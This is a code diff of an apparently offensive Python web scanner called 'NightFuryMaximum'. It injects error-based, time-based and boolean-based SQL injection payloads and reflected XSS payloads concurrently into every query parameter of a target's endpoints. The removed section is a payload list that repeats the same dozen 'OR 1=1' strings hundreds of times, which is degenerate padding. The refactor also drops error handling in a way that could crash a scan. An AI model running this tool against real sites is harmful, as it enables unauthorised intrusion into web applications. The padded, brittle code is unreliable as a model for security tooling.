-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'#",
-            "1' OR '1'='1'/*", "1' OR 'a'='a", "1' OR 'a'='a'--", "1' OR 'a'='a'#", "1' OR 'a'='a'/*", "1' OR 1=1",
-            "1' OR 1=1--", "1' OR 1=1#", "1' OR 1=1/*", "1' OR '1'='1", "1' OR '1'='1'--", "1' OR 1=1#", "1' OR 1=1/*"
-        ]
+        payloads = list(self._get_deep_payloads('sqli_error'))
         
         error_patterns = [
             'mysql_fetch', 'mysql_num_rows', 'mysql_error', 'MySQLSyntaxErrorException',
@@ -891,39 +771,36 @@ class NightFuryMaximum:
             'driver', 'db2', 'sqlite', 'oracle', 'postgres', 'mysql'
         ]
         
+        test_tasks = []
         for endpoint in self.endpoints:
             if '?' not in endpoint:
                 continue
-            
-            try:
-                base, query = endpoint.split('?', 1)
-                params = parse_qs(query)
-                
-                for param in params:
-                    for payload in payloads:
-                        test_params = params.copy()
-                        test_params[param] = [payload]
-                        test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
-                        
-                        result = self.request(test_url)
-                        if not result['success']:
-                            continue
-                        
-                        content = result['response']['text'].lower()
-                        
-                        for pattern in error_patterns:
-                            if pattern.lower() in content:
-                                results.append({
-                                    'type': 'SQL Injection (Error Based)',
-                                    'url': test_url,
-                                    'param': param,
-                                    'payload': payload,
-                                    'evidence': pattern
-                                })
-                                print(f"    {Fore.RED}⚠ Found: {param} with {payload[:30]}...{Fore.RESET}")
-                                break
-            except:
+            base, query = endpoint.split('?', 1)
+            params = parse_qs(query)
+            for param in params:
+                for payload in payloads:
+                    test_params = params.copy()
+                    test_params[param] = [payload]
+                    test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
+                    test_tasks.append((test_url, param, payload))
+        
+        url_results = self._concurrent_request([t[0] for t in test_tasks])
+        for test_url, param, payload in test_tasks:
+            result = url_results.get(test_url)
+            if not result or not result['success']:
                 continue
+            content = result['response']['text'].lower()
+            for pattern in error_patterns:
+                if pattern.lower() in content:
+                    results.append({
+                        'type': 'SQL Injection (Error Based)',
+                        'url': test_url,
+                        'param': param,
+                        'payload': payload,
+                        'evidence': pattern
+                    })
+                    print(f"    {Fore.RED}⚠ Found: {param} with {payload[:30]}...{Fore.RESET}")
+                    break
         
         return results
     
@@ -932,53 +809,43 @@ class NightFuryMaximum:
         results = []
         print(f"  {Fore.BLUE}[2/14] Testing Time-based Blind SQLi...{Fore.RESET}")
         
-        payloads = [
-            ("' OR SLEEP(5)-- -", 4),
-            ("' OR SLEEP(5)#", 4),
-            ("1' AND SLEEP(5)--", 4),
-            ("' WAITFOR DELAY '00:00:05'--", 4),
-            ("1' WAITFOR DELAY '00:00:05'--", 4),
-            ("' OR pg_sleep(5)--", 4),
-            ("1' AND pg_sleep(5)--", 4),
-            ("' OR BENCHMARK(5000000,MD5(1))--", 4),
-            ("1' AND BENCHMARK(5000000,MD5(1))--", 4)
-        ]
+        payloads = list(self._get_deep_payloads('sqli_time'))
         
         for endpoint in self.endpoints:
             if '?' not in endpoint:
                 continue
             
-            try:
-                base, query = endpoint.split('?', 1)
-                params = parse_qs(query)
-                
-                # Baseline
-                start = time.time()
-                self.request(endpoint)
-                baseline = time.time() - start
-                
-                for param in params:
-                    for payload, threshold in payloads:
-                        test_params = params.copy()
-                        test_params[param] = [payload]
-                        test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
-                        
-                        start = time.time()
-                        self.request(test_url)
-                        elapsed = time.time() - start
-                        
-                        if elapsed > baseline + threshold:
-                            results.append({
-                                'type': 'SQL Injection (Time Based)',
-                                'url': test_url,
-                                'param': param,
-                                'payload': payload,
-                                'delay': f"{elapsed:.2f}s"
-                            })
-                            print(f"    {Fore.RED}⚠ Found: {param} time-based ({elapsed:.2f}s){Fore.RESET}")
-                            break
-            except:
-                continue
+            base, query = endpoint.split('?', 1)
+            params = parse_qs(query)
+            
+            # Baseline
+            bl_resp = self.request(endpoint)
+            baseline = bl_resp['response']['elapsed'] if bl_resp['success'] else 0.5
+            
+            test_tasks = []
+            for param in params:
+                for payload, threshold in payloads:
+                    test_params = params.copy()
+                    test_params[param] = [payload]
+                    test_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
+                    test_tasks.append((test_url, param, payload, threshold))
+            
+            url_results = self._concurrent_request([t[0] for t in test_tasks])
+            for test_url, param, payload, threshold in test_tasks:
+                result = url_results.get(test_url)
+                if not result or not result['success']:
+                    continue
+                elapsed = result['response']['elapsed']
+                if elapsed > baseline + threshold:
+                    results.append({
+                        'type': 'SQL Injection (Time Based)',
+                        'url': test_url,
+                        'param': param,
+                        'payload': payload,
+                        'delay': f"{elapsed:.2f}s"
+                    })
+                    print(f"    {Fore.RED}⚠ Found: {param} time-based ({elapsed:.2f}s){Fore.RESET}")
+                    break
         
         return results
     
@@ -987,58 +854,50 @@ class NightFuryMaximum:
         results = []
         print(f"  {Fore.BLUE}[3/14] Testing Boolean-based Blind SQLi...{Fore.RESET}")
         
-        boolean_pairs = [
-            ("' AND '1'='1", "' AND '1'='2"),
-            ("1 AND 1=1", "1 AND 1=2"),
-            ("' OR '1'='1'--", "' OR '1'='2'--"),
-            ("' OR 1=1--", "' OR 1=2--"),
-            ("' AND 1=1--", "' AND 1=2--")
-        ]
+        boolean_pairs = list(self._get_deep_payloads('sqli_boolean'))
         
         for endpoint in self.endpoints:
             if '?' not in endpoint:
                 continue
             
-            try:
-                base, query = endpoint.split('?', 1)
-                params = parse_qs(query)
-                
-                for param in params:
-                    for true_payload, false_payload in boolean_pairs:
-                        # True condition
-                        test_params = params.copy()
-                        test_params[param] = [true_payload]
-                        true_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
-                        true_result = self.request(true_url)
-                        
-                        if not true_result['success']:
-                            continue
-                        
-                        # False condition
-                        test_params[param] = [false_payload]
-                        false_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in test_params.items()])
-                        false_result = self.request(false_url)
-                        
-                        if not false_result['success']:
-                            continue
-                        
-                        # Compare responses
-                        true_len = len(true_result['response']['text'])
-                        false_len = len(false_result['response']['text'])
-                        
-                        if abs(true_len - false_len) > 50:  # Significant difference
-                            results.append({
-                                'type': 'SQL Injection (Boolean Based)',
-                                'url': endpoint,
-                                'param': param,
-                                'true_payload': true_payload,
-                                'false_payload': false_payload,
-                                'diff': abs(true_len - false_len)
-                            })
-                            print(f"    {Fore.RED}⚠ Found: {param} boolean-based{Fore.RESET}")
-                            break
-            except:
-                continue
+            base, query = endpoint.split('?', 1)
+            params = parse_qs(query)
+            
+            true_tasks = []
+            false_tasks = []
+            for param in params:
+                for true_payload, false_payload in boolean_pairs:
+                    tp = params.copy()
+                    tp[param] = [true_payload]
+                    true_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in tp.items()])
+                    tp[param] = [false_payload]
+                    false_url = base + "?" + "&".join([f"{k}={v[0]}" for k,v in tp.items()])
+                    true_tasks.append((true_url, param, true_payload, false_payload))
+                    false_tasks.append((false_url, param, true_payload, false_payload))
+            
+            all_urls = [t[0] for t in true_tasks] + [t[0] for t in false_tasks]
+            url_results = self._concurrent_request(list(set(all_urls)))
+            
+            for (true_url, param, true_payload, false_payload), (false_url, _, _, _) in zip(true_tasks, false_tasks):
+                true_result = url_results.get(true_url)
+                false_result = url_results.get(false_url)
+                if not true_result or not true_result['success']:
+                    continue
+                if not false_result or not false_result['success']:
+                    continue
+                true_len = len(true_result['response']['text'])
+                false_len = len(false_result['response']['text'])
+                if abs(true_len - false_len) > 50:
+                    results.append({
+                        'type': 'SQL Injection (Boolean Based)',
+                        'url': endpoint,
+                        'param': param,
+                        'true_payload': true_payload,
+                        'false_payload': false_payload,
+                        'diff': abs(true_len - false_len)
+                    })
+                    print(f"    {Fore.RED}⚠ Found: {param} boolean-based{Fore.RESET}")
+                    break
         
         return results
     
@@ -1091,7 +950,7 @@ class NightFuryMaximum:
         results = []
         print(f"  {Fore.BLUE}[5/14] Testing Reflected XSS...{Fore.RESET}")
         
-        payloads = [
+        payloads = list(self._get_deep_payloads('xss')) + [
             "<script>alert(1)</script>",
             "<img src=x onerror=alert(1)>",
             "<svg onload=alert(1)>",
@@ -1107,232 +966,35 @@ class NightFuryMaximum:
             "${alert(1)}",
             "<!--><script>alert(1)</script>",
             "<sc<script>ript>alert(1)</sc</script>ript>",
-            # Additional 500+ Deep XSS Payloads
-            "<details open ontoggle=confirm(1)>", " <svg/onload=confirm(1)>", "<video><source onerror=confirm(1)>", "<audio src=x onerror=confirm(1)>",
